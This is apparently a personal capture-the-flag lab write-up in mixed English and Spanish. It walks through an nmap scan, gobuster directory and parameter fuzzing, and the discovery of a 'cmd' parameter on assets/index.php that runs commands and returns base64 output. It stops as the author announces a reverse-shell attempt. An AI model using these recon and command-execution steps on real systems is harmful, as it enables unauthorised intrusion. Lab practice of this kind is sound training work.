First i will do a nmap scan to target 

[davidoberst@archlinux ~]$ sudo nmap -Pn -sV -O 10.65.145.2

we have : 
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

i open the webpage 
http://10.65.184.34/ 
im gonna do fuzzing
[davidoberst@archlinux Web-Content]$ gobuster dir -u http://10.65.184.34/ -w common.txt

no other items founded 
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.132.198
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
assets               (Status: 301) [Size: 315] [--> http://10.64.132.198/assets/]
server-status        (Status: 403) [Size: 278]
Progress: 20481 / 20481 (100.00%)
===============================================================
Finished
===============================================================
al entrar a assets sale una pagina en blanco,, as ique hare fuzzing a la pagina desde assets, y encontre index.php 

.hta                 (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
images               (Status: 301) [Size: 322] [--> http://10.64.132.198/assets/images/]
index.php            (Status: 200) [Size: 0]

luego de encontrar index .php en la sigueinte url : 
http://10.64.132.198/assets/index.php muestra una pagina en blanco, asi que ahora intentare hacer un fuzzing de paraemtros : 
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://10.64.132.198/assets/index.php?FUZZ=id
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
[+] Exclude Length:   0
[+] User Agent:       gobuster/3.8.2
[+] Timeout:          10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
[Status=200] [Length=72] [Word=cmd] http://10.64.132.198/assets/index.php?cmd=id
Progress: 6453 / 6453 (100.00%)

al poner el parametero : 
http://10.64.132.198/assets/index.php?cmd=id
el servidor rsponde con un mensaje en texto plano : 
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
es base64, al decodficiarlo muestra : 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
note que al poner cualquier comando responde siempre con base 64, probe con ls y responde con : 
images
index.php
styles.css

intentare poner una reverse shell : 
